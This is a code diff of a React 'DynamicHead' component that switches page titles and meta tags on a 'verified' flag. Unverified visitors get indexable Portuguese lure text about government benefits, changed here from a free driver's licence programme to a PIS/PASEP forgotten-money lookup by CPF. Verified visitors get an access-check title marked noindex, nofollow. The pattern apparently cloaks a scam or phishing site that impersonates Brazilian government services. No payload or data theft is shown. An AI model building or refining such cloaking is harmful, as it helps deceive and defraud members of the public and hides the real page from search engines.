@@ -7,9 +7,9 @@ interface DynamicHeadProps {
 const DynamicHead = ({ verified }: DynamicHeadProps) => {
   useEffect(() => {
     if (!verified) {
-      document.title = "Habilitação Gratuita 2026 - Programa Social de Carteira de Motorista";
-      setMeta("description", "Descubra como participar do programa de habilitação gratuita do governo federal. Confira os critérios, documentos necessários e o passo a passo completo para conseguir sua carteira de motorista sem custos em 2026.");
-      setMeta("keywords", "habilitação gratuita 2026, carteira de motorista sem custo, programa social CNH, como conseguir habilitação grátis, habilitação governo federal, CNH popular, inscrição habilitação gratuita, detran habilitação social, primeira carteira grátis, programa federal habilitação");
+      document.title = "Consulta PIS/PASEP e Valores Esquecidos";
+      setMeta("description", "Verifique se existem valores disponíveis de PIS/PASEP vinculados ao seu CPF. Consulta rápida e informativa sobre benefícios e valores esquecidos para trabalhadores brasileiros.");
+      setMeta("keywords", "consulta PIS PASEP, valores esquecidos, saque PIS, benefícios trabalhador, consulta CPF valores, PIS PASEP 2026, valores não resgatados, consulta online PIS");
       removeMeta("robots");
     } else {
       document.title = "Verificação de Acesso";
@@ -17,7 +17,7 @@ const DynamicHead = ({ verified }: DynamicHeadProps) => {
       removeMeta("keywords");
       setMeta("robots", "noindex, nofollow");
 
-      const existing = document.getElementById("jsonld-cnhsocial");
+      const existing = document.getElementById("jsonld-pispasep");
       if (existing) existing.remove();
     }
   }, [verified]);
